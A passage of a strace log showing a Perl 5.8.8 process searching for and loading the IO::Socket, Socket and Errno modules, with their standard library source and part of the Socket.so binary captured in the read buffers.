${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
8191  07:22:17.471010 stat64("/etc/perl/Socket.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.471026 stat64("/etc/perl/Socket.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.471040 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.471053 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.471067 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.471083 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.471097 stat64("/usr/lib/perl5/Socket.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.471109 stat64("/usr/lib/perl5/Socket.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.471123 stat64("/usr/share/perl5/Socket.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.471135 stat64("/usr/share/perl5/Socket.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.471148 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.471161 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
8191  07:22:17.471181 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.471206 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.471245 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.471264 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
8191  07:22:17.471670 brk(0x8239000)    = 0x8239000
8191  07:22:17.471942 read(8, "", 4096) = 0
8191  07:22:17.471958 close(8)          = 0
8191  07:22:17.472047 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8191  07:22:17.472072 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8191  07:22:17.472099 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
8191  07:22:17.472114 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
8191  07:22:17.472244 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8191  07:22:17.472279 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d57000
8191  07:22:17.472293 mmap2(0xb7d5c000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d5c000
8191  07:22:17.472309 close(8)          = 0
8191  07:22:17.472926 brk(0x825a000)    = 0x825a000
8191  07:22:17.473075 stat64("/etc/perl/Errno.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.473092 stat64("/etc/perl/Errno.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.473106 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.473119 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.473133 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.473146 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.473160 stat64("/usr/lib/perl5/Errno.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.473172 stat64("/usr/lib/perl5/Errno.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.473193 stat64("/usr/share/perl5/Errno.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.473233 stat64("/usr/share/perl5/Errno.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.473251 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.473278 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
8191  07:22:17.473300 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.473314 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.473325 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.473346 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
8191  07:22:17.474108 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
8191  07:22:17.474567 _llseek(8, 5966, [5966], SEEK_SET) = 0
8191  07:22:17.474584 _llseek(8, 0, [5966], SEEK_CUR) = 0
8191  07:22:17.474594 close(8)          = 0
8191  07:22:17.475005 brk(0x827b000)    = 0x827b000
8191  07:22:17.475134 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
8191  07:22:17.475652 _llseek(6, 6698, [6698], SEEK_SET) = 0
8191  07:22:17.475675 _llseek(6, 0, [6698], SEEK_CUR) = 0
8191  07:22:17.475710 close(6)          = 0
8191  07:22:17.475730 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475759 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
